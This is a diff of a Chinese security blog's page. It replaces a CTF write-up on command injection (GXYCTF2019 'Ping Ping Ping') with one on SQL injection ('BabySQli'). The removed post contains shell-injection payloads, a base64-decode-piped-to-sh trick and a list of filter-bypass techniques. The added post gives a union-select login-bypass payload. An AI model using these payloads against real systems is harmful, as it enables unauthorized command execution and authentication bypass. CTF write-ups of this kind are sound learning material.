@@ -5,7 +5,7 @@
   <meta charset="utf-8">
   <!-- SEO相关 -->
   
-  <link rel="canonical" href="https://hacker-hkl.github.io/2021/07/18/[gxyctf2019]ping ping ping/"/>
+  <link rel="canonical" href="https://hacker-hkl.github.io/2021/07/11/babysqli/"/>
   <!-- 渲染优化 -->
   <meta http-equiv='x-dns-prefetch-control' content='on' />
   <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
@@ -20,20 +20,20 @@
   <meta content="hacker-newbie blog" name="apple-mobile-web-app-title">
   <meta content="black-translucent" name="apple-mobile-web-app-status-bar-style">
   <meta content="telephone=no" name="format-detection">
-  <link rel="preload" href="/css/style.css?time=1631283058936" as="style">
+  <link rel="preload" href="/css/style.css?time=1631541606234" as="style">
   <!-- 页面元数据 -->
-  <title>【GXYCTF2019】Ping Ping Ping - hacker-newbie blog</title>
+  <title>【GXYCTF2019】BabySQli - hacker-newbie blog</title>
   <meta name="keywords" content="null">
-  <meta name="description" content="进去看到ping，应该是拿文件，试试?ip&#x3D;127.0.0.1;ls 出了flag.php和index.php，试着打开flag.phpcat flag.php 然后被过滤了空格 然后查看资料后可以用$&amp;#123;IFS&amp;#125;$过滤，使用之后大括号也被过滤了，不过没关系，我们可以不用大括号，注意过滤符后要加一个数字，不论是多少。 然后继续cat$IFS$1flag.php发现又过滤了flag">
+  <meta name="description" content="上图~~~    界面很简洁，老样子，试试二次注入，发现然并卵。但是发现了这道题是POST传参。 打开burp suite抓了包并对其进行了篡改，但并没有什么用。   然后看了下他的返回值发现有一行不知道什么的注释，然后百度了下发现是base32编码   然后用base32解码后发现还要base64解码。 出来是select * from user where username &#x3D; &#39;$n">
 <meta property="og:type" content="article">
-<meta property="og:title" content="【GXYCTF2019】Ping Ping Ping">
-<meta property="og:url" content="https://hacker-hkl.github.io/2021/07/18/[GXYCTF2019]Ping%20Ping%20Ping/index.html">
+<meta property="og:title" content="【GXYCTF2019】BabySQli">
+<meta property="og:url" content="https://hacker-hkl.github.io/2021/07/11/babySQLi/index.html">
 <meta property="og:site_name" content="hacker-newbie blog">
-<meta property="og:description" content="进去看到ping，应该是拿文件，试试?ip&#x3D;127.0.0.1;ls 出了flag.php和index.php，试着打开flag.phpcat flag.php 然后被过滤了空格 然后查看资料后可以用$&amp;#123;IFS&amp;#125;$过滤，使用之后大括号也被过滤了，不过没关系，我们可以不用大括号，注意过滤符后要加一个数字，不论是多少。 然后继续cat$IFS$1flag.php发现又过滤了flag">
+<meta property="og:description" content="上图~~~    界面很简洁，老样子，试试二次注入，发现然并卵。但是发现了这道题是POST传参。 打开burp suite抓了包并对其进行了篡改，但并没有什么用。   然后看了下他的返回值发现有一行不知道什么的注释，然后百度了下发现是base32编码   然后用base32解码后发现还要base64解码。 出来是select * from user where username &#x3D; &#39;$n">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/blog/favicon/android-chrome-192x192.png">
-<meta property="article:published_time" content="2021-07-17T16:00:00.000Z">
-<meta property="article:modified_time" content="2021-08-25T07:56:54.963Z">
+<meta property="article:published_time" content="2021-07-10T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-08-25T07:55:07.267Z">
 <meta property="article:author" content="hacker-newbie">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/blog/favicon/android-chrome-192x192.png">
@@ -2201,8 +2201,8 @@ ul.list-v >li>a:hover {
 }
 
   </style>
-  <link rel="stylesheet" href="/css/style.css?time=1631283058936" media="print" onload="this.media='all';this.onload=null">
-  <noscript><link rel="stylesheet" href="/css/style.css?time=1631283058936"></noscript>
+  <link rel="stylesheet" href="/css/style.css?time=1631541606234" media="print" onload="this.media='all';this.onload=null">
+  <noscript><link rel="stylesheet" href="/css/style.css?time=1631541606234"></noscript>
     <script>
       var userColorScheme=localStorage.getItem("user-color-scheme")
       if(userColorScheme){
@@ -2631,7 +2631,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
       <h1 class="title">
-        【GXYCTF2019】Ping Ping Ping
+        【GXYCTF2019】BabySQli
       </h1>
       <div class='new-meta-box'>
         
@@ -2662,7 +2662,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
             <div class="new-meta-item date">
   <a class='notlink'>
     <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
-    <p>发布于：2021年7月18日</p>
+    <p>发布于：2021年7月11日</p>
   </a>
 </div>
 
@@ -2673,7 +2673,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   <div class="new-meta-item browse leancloud">
     <a class='notlink'>
       
-      <div id="lc-pv" data-title="【GXYCTF2019】Ping Ping Ping" data-path="/2021/07/18/%5BGXYCTF2019%5DPing%20Ping%20Ping/">
+      <div id="lc-pv" data-title="【GXYCTF2019】BabySQli" data-path="/2021/07/11/babySQLi/">
         <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
         <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
         次浏览
@@ -2693,56 +2693,45 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 
   <div id="page-plugins-helper"></div>
-  <p>进去看到ping，应该是拿文件，试试<code>?ip=127.0.0.1;ls</code></p>
-<p>出了flag.php和index.php，试着打开flag.php<code>cat flag.php</code></p>
-<p>然后被过滤了空格<img src="/buuctf/ping1.PNG" class="lazyload" data-srcset="/buuctf/ping1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
-<p>然后查看资料后可以用<code>$&#123;IFS&#125;$</code>过滤，使用之后大括号也被过滤了，不过没关系，我们可以不用大括号，注意过滤符后要加一个数字，不论是多少。</p>
-<p>然后继续<code>cat$IFS$1flag.php</code>发现又过滤了flag。哭了呀。</p>
-<p>只能打开index.php了，<code>cat$IFS$1index.php</code>出现php代码。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\--&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> preg_match(<span class="string">&quot;/\&amp;amp;|\/|\?|\*|\&amp;lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&amp;gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your symbol!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ /&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your space!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/bash/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your bash!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span> = shell_exec(<span class="string">&quot;ping -c 4 &quot;</span>.<span class="variable">$ip</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">  print_r(<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+  <p>上图~~~</p>
+<img src="/buuctf/DBabySQL1.PNG" class="lazyload" data-srcset="/buuctf/DBabySQL1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="DBabySQL1" style="zoom:60%;" />
 
-<p>这些再网页源码中。看到这了，已经很明了了，知到过滤了些什么。我们主要看flag的过滤方式，正则表达式<code>.*</code>意思是匹配后面的一切字符，结束为止。我们看到后面还有一个变量a。我们可以替换变量。</p>
-<p><strong>payload</strong></p>
-<p><code>?ip=127.0.0.1;a=f;cat$IFS$1$alag.php</code> 然后<img src="/buuctf/ping2.PNG" class="lazyload" data-srcset="/buuctf/ping2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
-<p>继续式<code>l、a、g</code>之后只有g可以，这正应证了上面所说，怎么规则表达结束为止，所以这里只有g可以。它这个flag并不会直接显示出来。</p>
-<p><strong>还有之中方法就是利用sh</strong></p>
-<p><code>?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</code></p>
-<p><code>Y2F0IGZsYWcucGhw =&gt; cat falg.php  ; sh为执行前面那段话</code></p>
-<p>这样也可以得到flag.因为bash方法不能用，但可以用sh。</p>
-<p>当然，绕过方式并不止这些。通过阅读大佬博客还有内联执行。</p>
-<p><strong>内联执行</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;cat$IFS<span class="variable">$1</span>`ls` </span><br><span class="line">//内联，就是将反引号内命令的输出作为输入执行</span><br></pre></td></tr></table></figure>
+<p><img src="/buuctf/DBabySQL2.PNG" class="lazyload" data-srcset="/buuctf/DBabySQL2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
+<p>界面很简洁，老样子，试试二次注入，发现然并卵。但是发现了这道题是POST传参。</p>
+<p>打开burp suite抓了包并对其进行了篡改，但并没有什么用。</p>
+<img src="/buuctf/DBabySQL3.PNG" class="lazyload" data-srcset="/buuctf/DBabySQL3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="DBabySQL3" style="zoom:60%;" />
 
-<p><strong>代替空格</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$IFS</span></span><br><span class="line"><span class="variable">$&#123;IFS&#125;</span></span><br><span class="line">$IFS<span class="variable">$1</span> //<span class="variable">$1</span>改成$加其他数字貌似都行</span><br><span class="line">&lt; //cat&lt;a.txt</span><br><span class="line">&lt;&gt;  </span><br><span class="line">&#123;cat,flag.php&#125;  //用逗号实现了空格功能</span><br><span class="line">%20 (space)</span><br><span class="line">%09 (tab)</span><br></pre></td></tr></table></figure>
+<p>然后看了下他的返回值发现有一行不知道什么的注释，然后百度了下发现是base32编码</p>
+<img src="/buuctf/DBabySQL4.PNG" class="lazyload" data-srcset="/buuctf/DBabySQL4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="DBabySQL4" style="zoom:60%;" />
 
-<p><strong>关键字绕过方法。</strong></p>
-<p><strong>方法一:特殊变量</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$*</span><br><span class="line"><span class="variable">$@</span></span><br><span class="line"><span class="variable">$x</span> (x 代表 1~9)</span><br><span class="line"><span class="variable">$&#123;x&#125;</span>   (x&gt;=10)</span><br><span class="line">在没有传参的情况下，上面的特殊变量都是为空 ca&#123;21&#125;t a.txt</span><br></pre></td></tr></table></figure>
+<p>然后用base32解码后发现还要base64解码。</p>
+<p>出来是<code>select * from user where username = &#39;$name&#39;</code></p>
+<p>这就可以看出这道题是对数据库进行查询的。</p>
+<p>然后用刚刚了解到的fuzz测试测了下。啊~我这个fuzz字典感觉不是很好吧。</p>
+<p><img src="/buuctf/DBabySQL5.PNG" class="lazyload" data-srcset="/buuctf/DBabySQL5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="DBabySQL5"></p>
+<p>虽然不是很好，但还是看得出对哪些字符有过滤的，得知对联合查询并没有过滤但是对order、or、=等字符进行了过滤。</p>
+<p>这里只能用unions elect代替order by了。</p>
+<p>输入1’ unions elect 1,2,3,4# 返回错误 再试试 1’ union select 1,2,3#返回正确。</p>
+<p>可以得知有3列字段。</p>
+<p>这里使用联合查询数据库，报错注入查询，都不行。感觉没辙了，再试试时间注入。</p>
+<p><img src="/buuctf/DBabySQL7.PNG" class="lazyload" data-srcset="/buuctf/DBabySQL7.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
+<p>结果都显示这个。麻了，然后查阅了大佬的博客发现一个新的知识点。</p>
+<p><strong>联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据。</strong></p>
+<p>上面的尝试中，我们应该可以发现，admin的用户是存在的。</p>
+<p>在知识点中，我是这样理解的，在联合查询一个并不存在的数据，他会构造一个虚拟的数据，我们利用这个虚拟的数据是可以登陆成功的。</p>
+<p>大佬给的数据是这样的：</p>
+<p>密码: 1234</p>
+<p>MD5：81dc9bdb52d04dc20036dbd8313ed055</p>
+<p>然后构造playload:</p>
+<p>账号：1’ union select 1,’admin’,’81dc9bdb52d04dc20036dbd8313ed055’#</p>
+<p>密码：1234</p>
+<p>注意账号这里不能使用admin 具体我不清楚，我试了是不可以的。然后就直接拿到了flag。就是sqli-labs这个例子。</p>
+<img src="/buuctf/DBabySQL8.PNG" class="lazyload" data-srcset="/buuctf/DBabySQL8.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="DBabySQL8" style="zoom:60%;" />
 
-<p><strong>方法二:反斜杠</strong></p>
-<p><code>ca\t a.txt</code></p>
-<p><strong>方法三:变量替换</strong></p>
-<p><code>a=ca;b=t;c=a.txt;aaab $c</code></p>
-<p><strong>方法四:引号</strong></p>
-<p><code>c&#39;a&#39;t flag.php</code></p>
-<p><strong>方法五：编码绕过</strong></p>
-<p>base64编码绕过</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;cat a.txt&#x27;</span>| base64 Y2F0IGEudHh0Cg==</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;Y2F0IGEudHh0Cg==&#x27;</span>| base64 -d abc</span><br></pre></td></tr></table></figure>
-
-<p><strong>方法六：十六进制编码绕过</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;cat a.txt&#x27;</span>|xxd -p 63617420612e7478740a</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;0x63617420612e7478740a&#x27;</span>|xxd -r -p Abc</span><br></pre></td></tr></table></figure>
-
-<p><strong>方法七：通配符</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?</span><br><span class="line">*</span><br><span class="line">[...]: 匹配范围中任何一个字符 cat fl[abc]g.php</span><br><span class="line">[a-z]: 匹配a-z范围中任何一个字符 cat fl[a-z]g.php</span><br><span class="line">&#123;a,b&#125;: 对以逗号分割的文件列表进行拓展 cat fl&#123;b,c&#125;g.php</span><br></pre></td></tr></table></figure>
-
-<p><strong>命令分隔与执行多条命令</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1.&amp;</span><br><span class="line">&amp; 表示将任务置于后台执行</span><br><span class="line">2.&amp;&amp;</span><br><span class="line">只有在 &amp;&amp; 左边的命令返回真（命令返回值 $? == 0），&amp;&amp; 右边的命令才 会被执行。</span><br><span class="line">3.|</span><br><span class="line">| 表示管道，上一条命令的输出，作为下一条命令的参数</span><br><span class="line">4.||</span><br><span class="line">只有在 || 左边的命令返回假（命令返回值 $? == 1），|| 右边的命令才 会被执行。</span><br><span class="line">5.；</span><br><span class="line">多行语句用换行区分代码快，单行语句一般要用到分号来区分代码块</span><br></pre></td></tr></table></figure>
-
-
-
-
-
+<p>他是可以显示的，也就说明它虽不是真实的，但它是存在的。</p>
+<p>原理就是构造一个虚拟身份来绕过审核机制。</p>
+<p><img src="/buuctf/DBabySQL6.PNG" class="lazyload" data-srcset="/buuctf/DBabySQL6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="DBabySQL6"></p>
+<p> [参考文献]                           1.<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_46412682/article/details/107948262">参考大佬博客</a><br>                                2.<a target="_blank" rel="noopener" href="https://yuaneuro.cn/archives/21.html">联合查询构造虚拟数据-知识详解</a></p>
 
 
   
@@ -2761,7 +2750,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
               
             
               
-                <p>本文永久链接是：<a href=https://hacker-hkl.github.io/2021/07/18/[GXYCTF2019]Ping%20Ping%20Ping/>https://hacker-hkl.github.io/2021/07/18/[GXYCTF2019]Ping%20Ping%20Ping/</a></p>
+                <p>本文永久链接是：<a href=https://hacker-hkl.github.io/2021/07/11/babySQLi/>https://hacker-hkl.github.io/2021/07/11/babySQLi/</a></p>
               
             
           </blockquote>
@@ -2788,7 +2777,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-08-25T15:56:54+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-08-25T15:55:07+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
     <p>更新于：2021年8月25日</p>
@@ -2810,7 +2799,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://hacker-hkl.github.io/2021/07/18/[GXYCTF2019]Ping%20Ping%20Ping/&title=【GXYCTF2019】Ping Ping Ping - hacker-newbie blog&summary="
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://hacker-hkl.github.io/2021/07/11/babySQLi/&title=【GXYCTF2019】BabySQli - hacker-newbie blog&summary="
           
           >
           
@@ -2822,7 +2811,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://hacker-hkl.github.io/2021/07/18/[GXYCTF2019]Ping%20Ping%20Ping/&title=【GXYCTF2019】Ping Ping Ping - hacker-newbie blog&summary="
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://hacker-hkl.github.io/2021/07/11/babySQLi/&title=【GXYCTF2019】BabySQli - hacker-newbie blog&summary="
           
           >
           
@@ -2834,7 +2823,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://service.weibo.com/share/share.php?url=https://hacker-hkl.github.io/2021/07/18/[GXYCTF2019]Ping%20Ping%20Ping/&title=【GXYCTF2019】Ping Ping Ping - hacker-newbie blog&summary="
+          target="_blank" href="http://service.weibo.com/share/share.php?url=https://hacker-hkl.github.io/2021/07/11/babySQLi/&title=【GXYCTF2019】BabySQli - hacker-newbie blog&summary="
           
           >
           
@@ -2867,25 +2856,31 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     <div class="prev-next">
       
-        <a class='prev' href='/2021/07/25/%E3%80%90%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%E3%80%91Knife/'>
-          <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>【极客大挑战 2019】Knife</p>
-          <p class='content'>页面看到一句话木马
-
-然后用中国菜刀连接下。并没有那么复杂，直接就可以连接上。
-
-在根目录找到flag.
-
-</p>
-        </a>
-      
-      
-        <a class='next' href='/2021/07/18/%5BSUCTF%202019%5DEasySQL/'>
-          <p class='title'>【SUCTF 2019】 *EasySQL*<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+        <a class='prev' href='/2021/07/11/babySQL/'>
+          <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>【极客大挑战 2019】babySQL</p>
           <p class='content'>上图~~~
 
 
 
-这界面真是短小精炼，经过一番很正经的乱七八糟的操作，显然，在我即将刷完且没有刷完的sqli-labs的程度下，这道题对我来说是没有任何悬念的。操作之后发现只有输入非零数字回显“...</p>
+
+从tip可以看到对数据进行了过滤，真以为双写绕过就可以了？？我们就要进行各种绕过。
+开始试了下二次注入，发现登陆成功，给了一串令人深思数字，结果发现屁都没有。
+
+
+可以推断这...</p>
+        </a>
+      
+      
+        <a class='next' href='/2021/05/01/SVN%E6%B3%84%E6%BC%8F/'>
+          <p class='title'>SVN泄漏<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>SVN泄露
+
+解题环境：kali linux
+工具：svnExploit
+
+
+获取svnExploit模块
+1git clone https://github.com/admintony/svn...</p>
         </a>
       
     </div>
@@ -2949,7 +2944,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <script>
   window.pdata={}
   pdata.ispage=true;
-  pdata.postTitle="【GXYCTF2019】Ping Ping Ping";
+  pdata.postTitle="【GXYCTF2019】BabySQli";
   pdata.commentPath="";
   pdata.commentPlaceholder="";
   //  see: /layout/_partial/scripts/_ctrl/coverCtrl.ejs
@@ -3796,7 +3791,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
     
-    volantis.js('/js/rightMenu.js?time=1631283058936')
+    volantis.js('/js/rightMenu.js?time=1631541606234')
   </script>
 
 
@@ -3910,19 +3905,19 @@ volantis.pjax.push(bindToggleButton);
     
       const sites_api = document.getElementById('sites-api');
       if (sites_api != undefined && typeof SitesJS === 'undefined') {
-        volantis.js("/js/plugins/sites.js?time=1631283058936")
+        volantis.js("/js/plugins/sites.js?time=1631541606234")
       }
     
     
       const friends_api = document.getElementById('friends-api');
       if (friends_api != undefined && typeof FriendsJS === 'undefined') {
-        volantis.js("/js/plugins/friends.js?time=1631283058936")
+        volantis.js("/js/plugins/friends.js?time=1631541606234")
       }
     
     
       const contributors_api = document.getElementById('contributors-api');
       if (contributors_api != undefined && typeof ContributorsJS === 'undefined') {
-        volantis.js("/js/plugins/contributors.js?time=1631283058936")
+        volantis.js("/js/plugins/contributors.js?time=1631541606234")
       }
     
   };
@@ -3995,7 +3990,7 @@ volantis.pjax.push(bindToggleButton);
 
     
       // 右键 music 需要在 APlayer  MetingJS 之后加载
-      await volantis.js('/js/aplayer.js?time=1631283058939')
+      await volantis.js('/js/aplayer.js?time=1631541606237')
       volantis.APlayerController.music = true;
     
   })();
@@ -4090,7 +4085,7 @@ volantis.pjax.push(bindToggleButton);
       emojiMaps: emojiMaps,
     }))
   }
-  volantis.js('/js/valine.js?time=1631283058936').then(pjax_valine)
+  volantis.js('/js/valine.js?time=1631541606234').then(pjax_valine)
   volantis.pjax.push(pjax_valine);
 </script>
 
@@ -4099,7 +4094,7 @@ volantis.pjax.push(bindToggleButton);
 
 
 
-<script src="/js/app.js?time=1631283058936.js"></script>
+<script src="/js/app.js?time=1631541606234.js"></script>
 
 
 <!-- optional -->
@@ -4112,7 +4107,7 @@ volantis.pjax.push(bindToggleButton);
 
   function loadSearchScript() {
     // see: layout/_partial/scripts/_ctrl/cdnCtrl.ejs
-    return volantis.js("/js/search/hexo.js?time=1631283058936");
+    return volantis.js("/js/search/hexo.js?time=1631541606234");
   }
 
   function loadSearchService() {
@@ -4380,8 +4375,8 @@ volantis.pjax.push(bindToggleButton);
   <script>
   volantis.message = (title, message, option = {}, done = null) => {
     if (typeof iziToast == "undefined") {
-      volantis.css('/css/message.css?time=1631283058936')
-      volantis.js('/js/message.js?time=1631283058936', () => {
+      volantis.css('/css/message.css?time=1631541606234')
+      volantis.js('/js/message.js?time=1631541606234', () => {
         tozashMessage(title, message, option, done);
       });
     } else {
@@ -4425,8 +4420,8 @@ volantis.pjax.push(bindToggleButton);
 
   volantis.question = (title, message, option = {}, success = null, cancel = null, done = null) => {
     if (typeof iziToast == "undefined") {
-      volantis.css('/css/message.css?time=1631283058936')
-      volantis.js('/js/message.js?time=1631283058936', () => {
+      volantis.css('/css/message.css?time=1631541606234')
+      volantis.js('/js/message.js?time=1631541606234', () => {
